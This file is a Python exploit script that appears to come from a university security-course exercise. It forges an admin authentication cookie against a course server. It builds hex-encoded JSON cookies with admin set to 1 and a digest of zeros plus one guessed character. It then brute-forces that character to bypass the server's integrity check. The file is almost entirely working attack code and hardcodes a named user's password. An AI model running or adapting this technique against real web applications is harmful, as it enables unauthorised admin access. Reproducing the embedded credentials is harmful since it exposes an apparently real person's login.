import json
import binascii
import requests
from tqdm import tqdm

# Config
TARGET_URL = "http://shell.hackintro25.di.uoa.gr:57828/"  
COOKIE_NAME = "auth"
USER = "Chantay Kostiuk"
PASSWORD = "061090"
ADMIN = 1

def forge_cookie(last_char_guess):
    """Create cookie JSON with guessed last char of digest"""
    cookie = {
        "user": USER,
        "password": PASSWORD,
        "admin": ADMIN,
        "digest": "0" * 127 + last_char_guess
    }
    cookie_json = json.dumps(cookie)
    cookie_hex = binascii.hexlify(cookie_json.encode('ascii')).decode()
    return cookie_hex

def test_cookie(cookie_hex):
    """Test if cookie is accepted by server (status 200 means success)"""
    cookies = {COOKIE_NAME: cookie_hex}
    try:
        response = requests.get(TARGET_URL, cookies=cookies, allow_redirects=False, timeout=5)
        return response.status_code == 200
    except requests.RequestException:
        return False

def main():
    print("[*] Starting brute-force of last digest character...")
    success = False
    for ch in tqdm('0123456789abcdef'):
        forged_cookie = forge_cookie(ch)
        if test_cookie(forged_cookie):
            success = True
            break
    if(success):
        print(f"\n[+] Success! Valid cookie found with last digest char '{ch}'")
        print(f"[+] Forged cookie (hex): {forged_cookie}")
        print(f"[+] You can use this cookie to access the admin page!")
    else:
        print("[-] Failed to forge a valid cookie")


if __name__ == "__main__":
    main()
